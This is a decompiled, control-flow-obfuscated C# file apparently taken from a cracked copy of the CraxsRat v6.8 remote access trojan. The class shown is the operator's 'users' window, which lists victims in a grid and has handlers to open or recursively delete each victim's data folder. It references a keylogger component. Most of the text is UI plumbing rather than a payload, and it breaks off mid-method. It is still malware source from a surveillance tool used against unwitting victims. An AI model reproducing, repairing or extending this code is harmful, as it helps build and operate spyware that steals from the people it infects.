// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.Win_Users
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Craxs_Rat.My;
using dummy_ptr;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class Win_Users : Form
  {
    internal DataSet \u0024VB\u0024ResumableLocal_DS\u0024498;
    internal Exception \u0024VB\u0024ResumableLocal_ex\u0024499;
    internal string[] \u0024VB\u0024ResumableLocal_SPL\u0024500;
    internal string \u0024VB\u0024ResumableLocal_handle\u0024501;
    internal Keylogger \u0024VB\u0024ResumableLocal_keylogg\u0024502;
    internal int \u0024VB\u0024ResumableLocal_flag\u0024503;
    internal string[] \u0024VB\u0024ResumableLocal_dataarry\u0024504;
    internal string \u0024VB\u0024ResumableLocal_is_on\u0024505;
    internal string[] \u0024VB\u0024ResumableLocal_Allnames\u0024506;
    internal Exception \u0024VB\u0024ResumableLocal_ex\u0024507;

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).components = (IContainer) new System.ComponentModel.Container();
      DataGridViewCellStyle gridViewCellStyle1 = new DataGridViewCellStyle();
      DataGridViewCellStyle gridViewCellStyle2 = new DataGridViewCellStyle();
label_1:
      int num1 = 684865240;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (--~(-num1 * -193952769) + 684466517)) % 51U)
        {
          case 0:
            gridViewCellStyle2.BackColor = Color.Black;
            gridViewCellStyle2.Font = new Font(EXGuarder.\u00314497812, 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * 1996130040 ^ -1334957546;
            continue;
          case 1:
            this.DGV0.AllowUserToDeleteRows = false;
            this.DGV0.AllowUserToResizeColumns = false;
            num1 = (int) num2 * 726653313 ^ 350079364;
            continue;
          case 2:
            this.DGV0.AllowUserToResizeRows = false;
            num1 = (int) num2 * -1804043016 ^ 1948245883;
            continue;
          case 3:
            this.Column1 = new DataGridViewTextBoxColumn();
            num1 = (int) num2 * -379836566 ^ -1008765821;
            continue;
          case 4:
            this.Column3.HeaderText = EXGuarder.\u00350010D40;
            this.Column3.Name = EXGuarder.\u003242B650E;
            this.Column3.Width = 54;
            num1 = (int) num2 * 107963099 ^ 1568641496;
            continue;
          case 5:
            this.DGV0.Size = new Size(393, 338);
            num1 = (int) num2 * -2110431674 ^ -1622565622;
            continue;
          case 6:
            this.Controls.Add((Control) this.DGV0);
            this.Name = EXGuarder.\u00318673D74;
            num1 = (int) num2 * 1404999759 ^ 638429186;
            continue;
          case 7:
            this.SuspendLayout();
            num1 = (int) num2 * -691406040 ^ -1828052867;
            continue;
          case 9:
            goto label_1;
          case 10:
            this.Column6 = new DataGridViewTextBoxColumn();
            num1 = (int) num2 * -487530167 ^ -823371942;
            continue;
          case 11:
            this.DGV0.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            this.DGV0.Columns.AddRange((DataGridViewColumn) this.Column1, (DataGridViewColumn) this.Column6, (DataGridViewColumn) this.Column3, (DataGridViewColumn) this.Column2);
            num1 = (int) num2 * 1150509337 ^ -1747106064;
            continue;
          case 12:
            gridViewCellStyle1.Font = new Font(EXGuarder.\u00314497812, 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            gridViewCellStyle1.ForeColor = Color.FromArgb(190, 190, 190);
            gridViewCellStyle1.SelectionBackColor = SystemColors.Highlight;
            gridViewCellStyle1.SelectionForeColor = SystemColors.HighlightText;
            gridViewCellStyle1.WrapMode = DataGridViewTriState.True;
            this.DGV0.ColumnHeadersDefaultCellStyle = gridViewCellStyle1;
            num1 = (int) num2 * 1374814573 ^ 1368797198;
            continue;
          case 13:
            this.DGV0.AllowUserToAddRows = false;
            num1 = (int) num2 * -1997888478 ^ 1424173780;
            continue;
          case 14:
            gridViewCellStyle1.Alignment = DataGridViewContentAlignment.MiddleLeft;
            gridViewCellStyle1.BackColor = Color.Black;
            num1 = (int) num2 * 1602327041 ^ -495913419;
            continue;
          case 15:
            ((ISupportInitialize) this.DGV0).BeginInit();
            num1 = (int) num2 * 792139657 ^ 396269587;
            continue;
          case 16:
            this.Column2.AutoSizeMode = DataGridViewAutoSizeColumnMode.None;
            num1 = (int) num2 * 1678058075 ^ -1767857873;
            continue;
          case 17:
            this.ctxz = new ContextMenuStrip(((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).components);
            num1 = (int) num2 * -2091801534 ^ -1108047594;
            continue;
          case 18:
            this.DeleteToolStripMenuItem.Text = EXGuarder.\u00322021008;
            this.AutoScaleDimensions = new SizeF(6f, 13f);
            num1 = (int) num2 * 1790229292 ^ 1782484777;
            continue;
          case 19:
            gridViewCellStyle2.Alignment = DataGridViewContentAlignment.MiddleLeft;
            num1 = (int) num2 * -1431981155 ^ 526007257;
            continue;
          case 20:
            this.AutoScaleMode = AutoScaleMode.Font;
            this.ClientSize = new Size(393, 338);
            num1 = (int) num2 * -1153348875 ^ 1580578762;
            continue;
          case 21:
            this.DGV0.BorderStyle = BorderStyle.None;
            num1 = (int) num2 * -1060700118 ^ -892244839;
            continue;
          case 22:
            gridViewCellStyle2.SelectionForeColor = Color.Black;
            num1 = (int) num2 * 2128826720 ^ 970751405;
            continue;
          case 23:
            this.DGV0.TabIndex = 4;
            this.Column1.HeaderText = EXGuarder.\u00335282909;
            num1 = (int) num2 * 1405582033 ^ 512703112;
            continue;
          case 24:
            this.Column2 = new DataGridViewImageColumn();
            this.TOpacity = new Timer(((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).components);
            num1 = (int) num2 * -676564843 ^ -1176381898;
            continue;
          case 25:
            this.ctxz.SuspendLayout();
            num1 = (int) num2 * 1659592825 ^ -602190879;
            continue;
          case 26:
            gridViewCellStyle2.WrapMode = DataGridViewTriState.False;
            num1 = (int) num2 * 901059893 ^ 1842401409;
            continue;
          case 27:
            this.Column1.Name = EXGuarder.\u00318551164;
            this.Column1.Width = 61;
            num1 = (int) num2 * -794991298 ^ -311777678;
            continue;
          case 28:
            this.Column6.Name = EXGuarder.\u0032B36585E;
            this.Column6.Width = 40;
            num1 = (int) num2 * 1293137547 ^ 1512660418;
            continue;
          case 29:
            this.Column6.HeaderText = EXGuarder.\u003190D7941;
            num1 = (int) num2 * 1656169660 ^ 1910123438;
            continue;
          case 30:
            this.OpenToolStripMenuItem.Text = EXGuarder.\u00324280325;
            this.DeleteToolStripMenuItem.Name = EXGuarder.\u0030C426302;
            num1 = (int) num2 * 538240714 ^ 766307904;
            continue;
          case 31:
            this.DGV0.EnableHeadersVisualStyles = false;
            this.DGV0.GridColor = Color.FromArgb(42, 42, 42);
            this.DGV0.Location = new Point(0, 0);
            num1 = (int) num2 * -514306603 ^ -127919849;
            continue;
          case 32:
            this.TOpacity.Interval = 1;
            num1 = (int) num2 * -877932686 ^ -131342128;
            continue;
          case 33:
            this.OpenToolStripMenuItem.Size = new Size(155, 22);
            num1 = (int) num2 * 48341991 ^ -1979022591;
            continue;
          case 34:
            this.DeleteToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * -321807991 ^ -1888195302;
            continue;
          case 35:
            this.Opacity = 0.0;
            this.Text = EXGuarder.\u00318673D74;
            num1 = (int) num2 * 960630023 ^ -618717455;
            continue;
          case 36:
            this.ctxz.ShowImageMargin = false;
            this.ctxz.Size = new Size(156, 70);
            this.OpenToolStripMenuItem.Name = EXGuarder.\u0030C0D5578;
            num1 = (int) num2 * 1787608422 ^ -190061036;
            continue;
          case 37:
            this.DGV0.ColumnHeadersBorderStyle = DataGridViewHeaderBorderStyle.None;
            num1 = (int) num2 * 1322262071 ^ -32676846;
            continue;
          case 38:
            this.Column3 = new DataGridViewTextBoxColumn();
            num1 = (int) num2 * 1790537804 ^ 322377537;
            continue;
          case 39:
            this.DeleteToolStripMenuItem.Size = new Size(155, 22);
            num1 = (int) num2 * 240736239 ^ 1446561738;
            continue;
          case 40:
            this.ctxz.Items.AddRange(new ToolStripItem[2]
            {
              (ToolStripItem) this.OpenToolStripMenuItem,
              (ToolStripItem) this.DeleteToolStripMenuItem
            });
            this.ctxz.Name = EXGuarder.\u003724C0727;
            num1 = (int) num2 * -260255361 ^ -2054726249;
            continue;
          case 41:
            this.OpenToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * -1515097 ^ 625430994;
            continue;
          case 42:
            this.Column2.HeaderText = EXGuarder.\u0032C3D760D;
            this.Column2.MinimumWidth = 2;
            this.Column2.Name = EXGuarder.\u003686B3731;
            this.Column2.SortMode = DataGridViewColumnSortMode.Programmatic;
            this.Column2.Width = 2;
            num1 = (int) num2 * -1032478090 ^ -89612155;
            continue;
          case 43:
            this.DGV0.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.AllCells;
            this.DGV0.AutoSizeRowsMode = DataGridViewAutoSizeRowsMode.AllCells;
            this.DGV0.BackgroundColor = Color.Black;
            num1 = (int) num2 * -1836260202 ^ -679857707;
            continue;
          case 44:
            ((ISupportInitialize) this.DGV0).EndInit();
            this.ctxz.ResumeLayout(false);
            num1 = (int) num2 * -1007515842 ^ 1614114376;
            continue;
          case 45:
            this.DGV0.DefaultCellStyle = gridViewCellStyle2;
            this.DGV0.Dock = DockStyle.Fill;
            this.DGV0.EditMode = DataGridViewEditMode.EditProgrammatically;
            num1 = (int) num2 * 36425939 ^ 2003179762;
            continue;
          case 46:
            this.DGV0.Name = EXGuarder.\u0031E2B0F26;
            this.DGV0.RowHeadersBorderStyle = DataGridViewHeaderBorderStyle.Single;
            this.DGV0.RowHeadersVisible = false;
            this.DGV0.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
            num1 = (int) num2 * 392656740 ^ -706728341;
            continue;
          case 47:
            this.DGV0.CellBorderStyle = DataGridViewCellBorderStyle.None;
            num1 = (int) num2 * -1441690331 ^ 1671679715;
            continue;
          case 48:
            this.Column2.FillWeight = 1f;
            num1 = (int) num2 * -725701234 ^ 1088188269;
            continue;
          case 49:
            this.DGV0 = new DataGridView();
            num1 = (int) num2 * -400245864 ^ -1873065355;
            continue;
          case 50:
            gridViewCellStyle2.ForeColor = Color.FromArgb(190, 190, 190);
            gridViewCellStyle2.SelectionBackColor = Color.FromArgb(190, 190, 190);
            num1 = (int) num2 * 1340050269 ^ 1308823419;
            continue;
          default:
            goto label_52;
        }
      }
label_52:
      this.ResumeLayout(false);
    }

    internal virtual DataGridView DGV0
    {
      get => ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._DGV0;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DataGridViewCellEventHandler cellEventHandler = new DataGridViewCellEventHandler(this.DGV0_CellContentClick);
label_1:
        int num1 = 755004061;
        while (true)
        {
          int num2 = num1;
          uint num3;
          DataGridView dgV0;
          DataGridViewCellMouseEventHandler mouseEventHandler;
          switch ((num3 = (uint) (-(-(((-143474642 ^ -588852930) - 205361754 ^ ~-739391498) + 1896471501 * -(625687055 * 1986725743) - (num2 ^ -~(~-1746583330 * 1122051635 - (-2110555149 * -1531045105 ^ 284522046)))) ^ ~404468285) ^ 823304816)) % 9U)
          {
            case 0:
              dgV0.CellContentClick -= cellEventHandler;
              dgV0.CellMouseDoubleClick -= mouseEventHandler;
              num1 = (int) num3 * -2063353131 ^ -1030579549;
              continue;
            case 1:
              ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._DGV0 = value;
              dgV0 = ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._DGV0;
              num1 = 839434316;
              continue;
            case 2:
              dgV0.CellMouseDoubleClick += mouseEventHandler;
              num1 = (int) num3 * 130861697 ^ -414396611;
              continue;
            case 3:
              dgV0.CellContentClick += cellEventHandler;
              num1 = (int) num3 * -529575368 ^ -1887618616;
              continue;
            case 4:
              goto label_3;
            case 5:
              int num4 = dgV0 == null ? -1930879893 : (num4 = -1166720880);
              num1 = num4 ^ (int) num3 * -1473531269;
              continue;
            case 6:
              goto label_1;
            case 7:
              mouseEventHandler = new DataGridViewCellMouseEventHandler(this.DGV0_CellMouseDoubleClick);
              dgV0 = ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._DGV0;
              num1 = (int) num3 * 1665244801 ^ -1344748629;
              continue;
            case 8:
              int num5 = dgV0 == null ? -2101399854 : (num5 = -1690470166);
              num1 = num5 ^ (int) num3 * -129374894;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual DataGridViewTextBoxColumn Column1
    {
      get => ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._Column1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._Column1 = value;
      }
    }

    internal virtual DataGridViewTextBoxColumn Column6
    {
      get => ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._Column6;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._Column6 = value;
      }
    }

    internal virtual DataGridViewTextBoxColumn Column3
    {
      get => ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._Column3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._Column3 = value;
      }
    }

    internal virtual DataGridViewImageColumn Column2
    {
      get => ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._Column2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._Column2 = value;
      }
    }

    internal virtual Timer TOpacity
    {
      get
      {
        return ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._TOpacity;
      }
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TOpacity_Tick);
label_1:
        int num1 = 1755149565;
        Timer topacity;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~((num1 - (~(--375732002 * 1553777465) + (476047584 + 1616622706) - (-1699164097 * -1114369609 + (--2046850509 + -41696890 * -655262229) - -235112351))) * -1213819739 * 1189757259) + --1863909041 ^ -1213729053)) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              topacity = ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._TOpacity;
              int num3 = topacity == null ? 75630329 : (num3 = 1286135846);
              num1 = num3 ^ (int) num2 * 1112319884;
              continue;
            case 2:
              goto label_3;
            case 3:
              topacity.Tick += eventHandler;
              num1 = (int) num2 * -562392834 ^ -341011637;
              continue;
            case 4:
              ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._TOpacity = value;
              num1 = -1644805862;
              continue;
            case 5:
              topacity = ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._TOpacity;
              int num4 = topacity == null ? 1263017680 : (num4 = -2135848272);
              num1 = num4 ^ (int) num2 * 1075616241;
              continue;
            case 6:
              topacity.Tick -= eventHandler;
              num1 = (int) num2 * -541574360 ^ 874996854;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual ContextMenuStrip ctxz
    {
      get => ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._ctxz;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._ctxz = value;
      }
    }

    internal virtual ToolStripMenuItem OpenToolStripMenuItem
    {
      get
      {
        return ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._OpenToolStripMenuItem;
      }
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.OpenToolStripMenuItem_Click);
label_1:
        int num1 = -691627914;
        ToolStripMenuItem toolStripMenuItem;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((-(num1 - -1223516857 * -(-454081341 * (-139409133 - 1363697076 + (1782347560 - 399788457)))) ^ -((80811768 ^ -1965569672) * 220473723) ^ ~-1245335642) + ~-646763355 - -787626052)) % 9U)
          {
            case 0:
              goto label_3;
            case 1:
              ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._OpenToolStripMenuItem = value;
              num1 = -367696952;
              continue;
            case 2:
              toolStripMenuItem = ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._OpenToolStripMenuItem;
              num1 = (int) num2 * 1930237498 ^ 950002014;
              continue;
            case 3:
              int num3 = toolStripMenuItem == null ? 1096779399 : (num3 = 80819384);
              num1 = num3 ^ (int) num2 * 1832493589;
              continue;
            case 4:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * 1283855165 ^ -1050335128;
              continue;
            case 5:
              goto label_1;
            case 6:
              int num4 = toolStripMenuItem == null ? 1154576614 : (num4 = -1256103518);
              num1 = num4 ^ (int) num2 * 2104950271;
              continue;
            case 7:
              toolStripMenuItem = ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._OpenToolStripMenuItem;
              num1 = (int) num2 * 1428063717 ^ 876612666;
              continue;
            case 8:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * -260071331 ^ 141764021;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual ToolStripMenuItem DeleteToolStripMenuItem
    {
      get
      {
        return ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._DeleteToolStripMenuItem;
      }
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DeleteToolStripMenuItem_Click);
        ToolStripMenuItem toolStripMenuItem = ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._DeleteToolStripMenuItem;
label_1:
        int num1 = -215874592;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (~(-2088086798 - -~-num2) - 1640155273)) % 7U)
          {
            case 0:
              toolStripMenuItem = ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._DeleteToolStripMenuItem;
              int num4 = toolStripMenuItem == null ? -1112574129 : (num4 = -821251085);
              num1 = num4 ^ (int) num3 * -746323643;
              continue;
            case 1:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num3 * -1403388428 ^ 677783688;
              continue;
            case 2:
              int num5 = toolStripMenuItem == null ? 233487706 : (num5 = -490452669);
              num1 = num5 ^ (int) num3 * -1212316274;
              continue;
            case 3:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num3 * 2123862938 ^ -1837357476;
              continue;
            case 4:
              goto label_3;
            case 5:
              ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._DeleteToolStripMenuItem = value;
              num1 = -575353570;
              continue;
            case 6:
              goto label_1;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    private void Win_Users_Load(object sender, EventArgs e)
    {
      this.Icon = new Icon(Settings.res_Path + EXGuarder.\u0034A3B6E6B);
label_1:
      int num1 = 238505501;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -(-~num1 * 1040567811 ^ ~(-414393504 ^ -2135313706))) % 5U)
        {
          case 0:
            this.SpyStyle();
            this.MYTEXT();
            num1 = (int) num2 * 1089875453 ^ -830993900;
            continue;
          case 1:
            this.DGV0.DefaultCellStyle.Font = Settings.f;
            num1 = (int) num2 * -2087886198 ^ -411462471;
            continue;
          case 3:
            goto label_1;
          case 4:
            this.DGV0.ContextMenuStrip = this.ctxz;
            this.DGV0.ColumnHeadersDefaultCellStyle.Font = Settings.f;
            num1 = (int) num2 * 1663263670 ^ -1729309643;
            continue;
          default:
            goto label_6;
        }
      }
label_6:
      this.TOpacity.Interval = Settings.T_Interval;
      this.TOpacity.Enabled = true;
    }

    private void SpyStyle()
    {
      IEnumerator<DataGridView> enumerator;
      try
      {
        enumerator = this.Controls.OfType<DataGridView>().GetEnumerator();
label_1:
        int num1 = -1856647588;
        DataGridView current;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -((num1 ^ (-~(-1198787137 - 906944495) ^ --(710944873 - 1827612894)) + 932653677 * ~~-1330360158) * 697224847 * -970431575 ^ -1338832409 ^ --1822361679)) % 9U)
          {
            case 0:
              current.DefaultCellStyle.SelectionForeColor = Settings.DefaultColor_Background;
              num1 = (int) num2 * -507433704 ^ 1230746564;
              continue;
            case 1:
              goto label_14;
            case 2:
              goto label_1;
            case 3:
              int num3;
              num1 = num3 = enumerator.MoveNext() ? -1587594393 : (num3 = 953682232);
              continue;
            case 4:
              current = enumerator.Current;
              current.BackgroundColor = Settings.DefaultColor_Background;
              current.BackColor = Settings.DefaultColor_Background;
              current.ColumnHeadersDefaultCellStyle.BackColor = Settings.DefaultColor_Background;
              current.DefaultCellStyle.BackColor = Settings.DefaultColor_Background;
              num1 = -715030689;
              continue;
            case 5:
              current.ColumnHeadersDefaultCellStyle.ForeColor = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
              num1 = (int) num2 * -559357694 ^ -291143676;
              continue;
            case 6:
              current.DefaultCellStyle.ForeColor = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
              num1 = (int) num2 * -334391473 ^ 1900095901;
              continue;
            case 7:
              current.DefaultCellStyle.SelectionBackColor = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
              num1 = (int) num2 * -169736994 ^ 1745626513;
              continue;
            case 8:
              num1 = (int) num2 * 396739416 ^ -600756238;
              continue;
            default:
              goto label_10;
          }
        }
label_14:
        return;
label_10:;
      }
      finally
      {
        if (enumerator != null)
        {
label_12:
          int num4 = 1012816726;
          while (true)
          {
            uint num5;
            switch ((num5 = (uint) -((num4 ^ (-~(-1198787137 - 906944495) ^ --(710944873 - 1827612894)) + 932653677 * ~~-1330360158) * 697224847 * -970431575 ^ -1338832409 ^ --1822361679)) % 3U)
            {
              case 0:
                goto label_12;
              case 1:
                enumerator.Dispose();
                num4 = (int) num5 * 572482924 ^ 915665303;
                continue;
              default:
                goto label_16;
            }
          }
        }
label_16:;
      }
    }

    private void TOpacity_Tick(object sender, EventArgs e)
    {
      if (this.Opacity == 1.0)
        goto label_5;
label_1:
      int num1 = -1155103265;
label_2:
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (92178373 * -818289573 - (-num2 - ((1123555624 ^ 354270284) + 446125971 - (210369496 - -1832977150 - (534091568 - 1929306622)) ^ ~~(-743278767 ^ -1998325565)) ^ -1795565859 ^ 676260148 ^ 307023346 ^ -1912206803 ^ -(-2064896000 - 997906582)))) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            goto label_5;
          case 3:
            this.Opacity += 0.1;
            num1 = (int) num3 * -1267268458 ^ 1351909707;
            continue;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:
      return;
label_5:
      this.TOpacity.Enabled = false;
      num1 = 1930398417;
      goto label_2;
    }

    private void Win_Users_Closing(object sender, CancelEventArgs e)
    {
      MyProject.Forms.CraxsRatMain.WU = (Win_Users) null;
    }

    private void DGV0_CellContentClick(object sender, DataGridViewCellEventArgs e)
    {
    }

    public void MYTEXT()
    {
      this.Text = EXGuarder.\u00358703A60 + Conversions.ToString(this.DGV0.Rows.Count) + EXGuarder.\u003293A0274;
    }

    private void DGV0_CellMouseDoubleClick(object sender, DataGridViewCellMouseEventArgs e)
    {
      if (this.DGV0.Rows.Count <= 0)
        return;
label_1:
      int num1 = 700489215;
      while (true)
      {
        int num2 = num1;
        uint num3;
        string str1;
        string str2;
        switch ((num3 = (uint) ((-(-((515156430 + (-808871976 ^ 887452991) ^ -137848754) - -1671209353) - num2) ^ -(-1108478627 * -1876339166) ^ (-643374428 ^ -1645018967) - (382310242 - 1638666025) ^ -673416111 * 259146665) - ~1215670082 ^ -2107600360)) % 9U)
        {
          case 0:
            Process.Start(str2);
            num1 = (int) num3 * -1974576619 ^ 853919576;
            continue;
          case 1:
            str1 = Conversions.ToString(this.DGV0.Rows[e.RowIndex].Cells[2].Value);
            num1 = (int) num3 * 550435077 ^ -296939814;
            continue;
          case 2:
            int num4 = e.RowIndex == -1 ? 1604811078 : (num4 = 1391841205);
            num1 = num4 ^ (int) num3 * 426585016;
            continue;
          case 3:
            this.MYTEXT();
            num1 = (int) num3 * -761324327 ^ -220928214;
            continue;
          case 4:
            str2 = Settings.res_Path + EXGuarder.\u00361190762 + str1;
            num1 = (int) num3 * -734480131 ^ -344611767;
            continue;
          case 5:
            goto label_1;
          case 6:
            int num5 = !Directory.Exists(str2) ? 590834944 : (num5 = -975892620);
            num1 = num5 ^ (int) num3 * 879338342;
            continue;
          case 7:
            this.DGV0.Rows.RemoveAt(e.RowIndex);
            num1 = -185139026;
            continue;
          case 8:
            goto label_11;
          default:
            goto label_12;
        }
      }
label_11:
      return;
label_12:;
    }

    private void OpenToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.DGV0.SelectedRows.Count <= 0)
        return;
label_1:
      int num1 = -171311333;
      string str1;
      string str2;
      int index;
      int num2;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (-num1 + (~298808773 + (-588756889 ^ -560929036) + ~(1066252195 * -1518095421) ^ -1164006373 * (264099022 - 219443951 + ~250779720)) - ~-(-1532575113 * -15630517) ^ --1733438771 * 649277347)) % 13U)
        {
          case 0:
            num1 = (int) num3 * 657824168 ^ -640613519;
            continue;
          case 1:
            index = num2;
            num1 = (int) num3 * -1885485528 ^ 68514398;
            continue;
          case 2:
            Process.Start(str2);
            num1 = (int) num3 * 1845413246 ^ -469852824;
            continue;
          case 3:
            str2 = Settings.res_Path + EXGuarder.\u00346217618 + str1;
            int num4 = !Directory.Exists(str2) ? 1082852173 : (num4 = 100503161);
            num1 = num4 ^ (int) num3 * -924284407;
            continue;
          case 4:
            num1 = (int) num3 * 2083872731 ^ 1983994647;
            continue;
          case 5:
            this.DGV0.Rows.RemoveAt(this.DGV0.SelectedRows[index].Index);
            num1 = -837845221;
            continue;
          case 6:
            int num5;
            num1 = num5 = index >= 0 ? 406200141 : (num5 = -1732423529);
            continue;
          case 7:
            goto label_15;
          case 8:
            checked { index += -1; }
            num1 = 352079805;
            continue;
          case 9:
            str1 = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[2].Value);
            num1 = -1322450026;
            continue;
          case 10:
            goto label_1;
          case 11:
            num2 = checked (this.DGV0.SelectedRows.Count - 1);
            num1 = (int) num3 * -345821290 ^ 701504676;
            continue;
          case 12:
            this.MYTEXT();
            num1 = (int) num3 * 1714567940 ^ -673310291;
            continue;
          default:
            goto label_16;
        }
      }
label_15:
      return;
label_16:;
    }

    private void DeleteToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.DGV0.SelectedRows.Count <= 0)
        return;
label_1:
      int num1 = 57253893;
      int index;
      string str;
      int num2;
      string path;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (-(-num1 ^ -(~(-1458912947 * 652018229) ^ ~(1540449869 + 187335364))) * 32813813)) % 8U)
        {
          case 0:
            str = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[2].Value);
            num1 = (int) num3 * -1390842091 ^ 560891299;
            continue;
          case 1:
            num2 = checked (this.DGV0.SelectedRows.Count - 1);
            num1 = (int) num3 * 1267953768 ^ -184787156;
            continue;
          case 2:
            if (index >= 0)
            {
              num1 = 987175720;
              continue;
            }
            goto label_15;
          case 4:
            index = num2;
            num1 = (int) num3 * -1697129158 ^ -262545038;
            continue;
          case 5:
            goto label_1;
          case 6:
            this.MYTEXT();
            num1 = (int) num3 * -655341454 ^ -859310293;
            continue;
          case 7:
            path = Settings.res_Path + EXGuarder.\u0034346486A + str;
            this.DGV0.Rows.RemoveAt(this.DGV0.SelectedRows[index].Index);
            num1 = (int) num3 * -861032996 ^ 1747883250;
            continue;
          default:
            if (Directory.Exists(path))
            {
              try
              {
                Directory.Delete(path, true);
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
label_13:
                int num4 = 432799935;
                while (true)
                {
                  uint num5;
